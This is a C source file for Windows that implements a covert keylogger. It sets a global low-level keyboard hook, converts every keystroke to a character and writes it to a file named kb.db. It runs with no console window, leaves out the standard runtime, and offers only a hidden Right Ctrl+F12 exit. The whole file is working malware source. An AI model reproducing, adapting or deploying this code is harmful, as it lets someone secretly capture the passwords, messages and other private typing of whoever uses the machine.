#include <windows.h>

#pragma comment(linker, "/DEFAULTLIB:kernel32.lib")		//Linking kernel32.lib
#pragma comment(linker, "/DEFAULTLIB:user32.lib")		//Linking user32.lib
#pragma comment(linker, "/NODEFAULTLIB:libc.lib")		//Removing standard library/CRT
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib")		//Removing standard library/CMT
#pragma comment(linker, "/NODEFAULTLIB:OLDNAMES.lib")	//Removing unneeded Library
#pragma comment(linker, "/SUBSYSTEM:windows")			//No console window
#pragma comment(linker, "/INCREMENTAL:no")				//Smaller code if multiple source files


#define MAXSIZE 2097152
#define LENGTH (length > MAXSIZE ? (length = 0) : length)
#define LLENGTH (llength > MAXSIZE ? (llength = 0) : llength)

char *keystate;
LPWSTR ochar;
HKL keylay;
KBDLLHOOKSTRUCT *keys;
unsigned char *a;
int length = 1;

DWORD WINAPI QueueThread(void *n) {
	int llength = 1;
	DWORD W;
	HANDLE hf = CreateFile("/kb.db", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);
	while(1) 
		if(LENGTH == LLENGTH) Sleep(1);
		else WriteFile(hf, (char *)(&a[llength++]), 1, &W, NULL);
	return 0;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (GetAsyncKeyState(VK_RCONTROL) && GetAsyncKeyState(VK_F12)) ExitProcess(0);
	if (wParam == WM_KEYDOWN) {
		keys = (KBDLLHOOKSTRUCT*)lParam;
		if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT) || GetKeyState(VK_CAPITAL) & 1) keystate[0x14] = keystate[0x10] = 0x80;
		else keystate[0x14] = keystate[0x10] = 0;
		if(GetAsyncKeyState(VK_LCONTROL) || GetAsyncKeyState(VK_RCONTROL)) keystate[0x11] = 0x80;
		else keystate[0x11] = 0;
		if(GetAsyncKeyState(VK_LMENU) || GetAsyncKeyState(VK_RMENU)) keystate[0x12] = 0x80;
		else keystate[0x12] = 0;
		if(ToUnicodeEx(keys->vkCode, keys->scanCode, (BYTE *)keystate, ochar, 10, 0, keylay) == 0) {
			a[length++] = '[';
			a[length++] = keys->vkCode;
			a[length++] = ']';
		}
		else a[length++] = (char)ochar[0];
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WinMainCRTStartup() {
	MSG msg;
	a = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAXSIZE);
	ochar = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10 * sizeof(char));
	keystate = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 256 * sizeof(char));
	keylay = GetKeyboardLayout(0);
	SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
	CreateThread(NULL, 0, QueueThread, NULL, 0, NULL);
	
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}